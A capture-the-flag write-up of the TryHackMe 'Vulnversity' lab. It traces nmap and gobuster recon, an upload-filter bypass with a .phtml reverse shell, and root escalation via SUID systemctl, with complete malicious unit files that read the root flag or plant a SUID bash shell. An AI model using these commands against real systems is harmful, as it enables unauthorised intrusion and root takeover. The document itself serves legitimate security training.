# Vulnversity — TryHackMe — ROOT

**Date:** 2026-09-03
**Platform:** TryHackMe
**Outcome:** user + root
**Time:** ~1.5h
**Tools:** nmap, gobuster, php-reverse-shell (pentestmonkey), netcat, systemctl (SUID)

---

## 0. TL;DR chain

nmap (host ignored ping → -Pn) → web on non-standard 3333 → gobuster → /internal/ upload form →
extension filter → .phtml accepted → pentestmonkey reverse shell → www-data →
SUID /bin/systemctl → malicious oneshot unit runs as root → root

## 1. Recon

`nmap -sV` returned nothing: the box ignored host discovery. `-Pn` (skip discovery, assume host
up) exposed:

| Port | Service | Means | Therefore |
|---|---|---|---|
| 21 | vsftpd 3.0.5 | FTP | anon check — nothing here |
| 22 | OpenSSH 8.2p1 | login surface | later, once creds exist |
| 139/445 | Samba 4 | SMB | possible user enum — not needed |
| 3128 | Squid 4.10 | proxy | note, not a path |
| 3333 | Apache 2.4.41 | **web on non-standard port** | primary attack surface |

The lesson is the empty first scan: "no ports" ≠ "no box". Retry with -Pn before trusting silence.

## 2. Foothold (user)

1. **Did:** `gobuster dir -u http://IP:3333 -w dir-list-medium.txt -t 64`
   **Why:** Apache with a thin front page → hidden paths.
   **Result:** `/internal/` — a file **upload form**.

2. **Did:** tested PHP extensions on the upload; `.php` rejected, **`.phtml` accepted**.
   **Why:** filters that blocklist extensions usually miss alternate spellings.
   **Result:** a web-executable payload path.
   (Burp Intruder/Sniper didn't come together in time; with N=5 extensions, manual testing is
   the faster tool anyway.)

3. **Did:** pentestmonkey `php-reverse-shell`, IP edited, renamed `php-reverse-shell.phtml`,
   uploaded, `nc -lvnp 1234`, triggered via
   `http://IP:3333/internal/uploads/php-reverse-shell.phtml`
   **Result:** www-data reverse shell. user.txt under `/home/bill`.

## 3. Privilege escalation (root)

### 3.1 Finding the lever

`find / -type f -perm -04000 -ls 2>/dev/null` lists every binary with the SUID bit. SUID means:
**whoever runs this file runs it as its owner (root), temporarily.** That is fine for `sudo`,
`passwd`, `su` — they are built to be safe. The question for every SUID binary is:
*can I make this run MY command as root?*

Scanning the `-rwsr-xr-x root root` lines, exactly one binary stands out: **/bin/systemctl** —
the systemd service manager. It normally is not SUID. Here it is.

### 3.2 The idea, in one sentence

systemctl executes unit files ("recipes" for services), each recipe says which command to run
(`ExecStart`), and this copy of systemctl runs as root — so whatever is written in ExecStart
runs as root. **The exploit is a text file.**

### 3.3 Proof step — make root write down that it ran

1. **Write the recipe:**

```
cat > /tmp/root.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/proof"
[Install]
WantedBy=multi-user.target
EOF
```

   - `cat > /tmp/root.service <<'EOF' ... EOF` — a heredoc: everything between the two `EOF`
     markers is written into the file. Quoted `'EOF'` = don't interpret the contents.
   - `[Service]` — section header: "what follows describes how the service runs."
   - `Type=oneshot` — run the command once, then exit (not a long-lived daemon).
   - `ExecStart=` — **the payload.** This line runs as root. Here: `id > /tmp/proof` = "write
     who-you-are into a file."
   - `[Install]` / `WantedBy=` — boilerplate systemd wants; the target name doesn't matter here.

2. **Register the unit:**

```
/bin/systemctl link /tmp/root.service
```

   `link` = "systemd, learn this unit file" — it creates the symlink
   `/etc/systemd/system/root.service -> /tmp/root.service`.

3. **Run it:**

```
/bin/systemctl start root.service
```

4. **Verify:**

```
cat /tmp/proof
uid=0(root) gid=0(root) groups=0(root)
```

`id` ran **as root** and wrote its answer. Root execution proven.

### 3.4 The confusing part — why `whoami` still says www-data

The service is a **detached background process**: it ran as root, did its one thing, and died.
It never touches your terminal. Your shell is still www-data and always will be — you never
"become" root interactively this way.

So root execution is something you *use*, through payloads that **move things** (copy files,
chmod things), not interactive shells. That is why the proof step exists: first prove
ExecStart runs as root, then decide what root should do for you.

### 3.5 Finisher — turn root execution into the flag

Same recipe, new payload, **new file name** (root.service already ran and is cached by systemd;
a fresh name avoids fighting a daemon reload):

```
cat > /tmp/flag.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/r && chmod 644 /tmp/r"
[Install]
WantedBy=multi-user.target
EOF
/bin/systemctl link /tmp/flag.service
/bin/systemctl start flag.service
cat /tmp/r        → root flag
```

Root reads the flag, copies it where www-data can read it, and makes it readable.

Alternative finisher: `ExecStart=/bin/sh -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"`,
then `/tmp/bash -p` — a SUID root shell you can actually type into.

## 4. Misses and dead ends

- `/tmp/proof` contained `uid=0(root)` — the exploit had already worked — and I read it as
  "nothing works" because `whoami` still said www-data. Third box in a row where the answer was
  on screen and I read past it.
- Pasted the whole multi-command block into a no-TTY netcat shell at once; the heredoc got
  mangled (`>` continuation prompts). One command at a time, Ctrl-C out of continuations.
- `nano` in a no-TTY shell → "Error opening terminal: unknown". No TTY means no editors; use
  cat/printf, or upgrade the shell (`python3 -c 'import pty; pty.spawn("/bin/sh")'`).
- `chmod +x` on a `.service` file — meaningless; unit files are configs, not scripts.
- Ran the **previous box's play** here: fake `curl` + `PATH=/tmp` export. Kenobi had a menu
  binary calling curl; this box has none. SUID asks "what does *this* binary do?".
- `nmap -Pn` called "stealth" — it's not; it skips host discovery. Right flag, wrong mental model.
- AI used twice mid-run (username lookup, scanning the SUID list); both times the answer was
  already in my own output — self-caught both times.

## 5. Lessons

1. Quote the output before declaring failure. If there's no pasted error, there was no error.
2. Know what each primitive gives you: a root service gives root *execution*, not a root shell —
   then pick your finisher deliberately.
3. Don't replay the last box. Every SUID, every service, every port: ask what *this* thing does.
